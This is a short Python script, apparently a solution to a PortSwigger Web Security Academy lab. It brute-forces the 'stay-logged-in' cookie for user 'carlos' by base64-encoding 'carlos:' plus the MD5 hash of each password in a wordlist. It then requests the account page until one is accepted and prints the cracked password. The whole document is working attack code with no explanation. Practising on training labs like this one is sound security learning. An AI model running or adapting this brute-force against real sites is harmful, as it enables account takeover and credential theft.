import requests
import base64
from hashlib import md5


url = "https://0a3d009203b7289a8151a2a1006600a2.web-security-academy.net/"
domain = url[8:]
s=requests.session()
s.get(url)


pwds = [line.strip() for line in open("../pass.txt", "r")]

for pwd in pwds:
    h = md5(pwd.encode()).hexdigest()
    b = base64.b64encode(b"carlos:"+h.encode())
    cookie = requests.cookies.create_cookie(domain="domain",name="stay-logged-in", value=b)
    cookies = {"stay-logged-in":b.decode()}
    r = s.get(url+"my-account", cookies = cookies, allow_redirects=False)
    if(r.status_code == 200):
        print(pwd)
        print(b)
        break



